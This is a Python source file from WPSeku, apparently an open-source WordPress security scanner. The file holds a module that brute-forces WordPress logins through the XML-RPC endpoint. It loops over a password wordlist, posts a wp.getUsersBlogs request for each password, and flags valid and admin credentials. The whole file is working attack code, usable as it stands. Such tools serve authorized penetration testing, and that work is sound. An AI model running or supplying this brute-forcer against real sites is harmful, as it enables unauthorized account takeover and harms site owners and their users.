#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# WPSeku: Wordpress Security Scanner
#
# @url: https://github.com/m4ll0k/WPSeku
# @author: Momo Outaadi (M4ll0k)
#
# WPSeku is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 3 of the License.
#
# WPSeku is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with WPSeku; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

from lib import wphttp 
from lib import wpprint
import re 

class wpxmlrpc:
	check = wphttp.check()
	printf = wpprint.wpprint()
	def __init__(self,agent,proxy,redirect,url,cookie,wordlist,user):
		self.url = url 
		self.cookie = cookie 
		self.wordlist = wordlist 
		self.user = user
		self.req = wphttp.wphttp(agent=agent,proxy=proxy,redirect=redirect)

	def run(self):
		self.printf.test('Starting bruteforce login via xmlrpc...')
		print ""
		passwd = open(self.wordlist,"rb")
		for x in passwd:
			payload = ("""<methodCall><methodName>wp.getUsersBlogs</methodName><params>
				<param><value><string>"""+self.user+"""</string></value></param>
				<param><value><string>"""+str(x.split('\n')[0])+"""</string></value></param></params></methodCall>""")
			self.printf.test("Trying Credentials: \"%s\" - \"%s\""%(self.user,x.split('\n')[0]))
			try:
				url = self.check.checkurl(self.url,'xmlrpc.php')
				resp = self.req.send(url,method="POST",payload=payload)
				html = resp.read()
				if re.search('<name>isAdmin</name><value><boolean>0</boolean>',html,re.I):
					self.printf.plus('Valid Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
				elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',html,re.I):
					self.printf.plus('Valid ADMIN Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
				else:
					self.printf.erro('Invalid Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
			except Exception as error:
				pass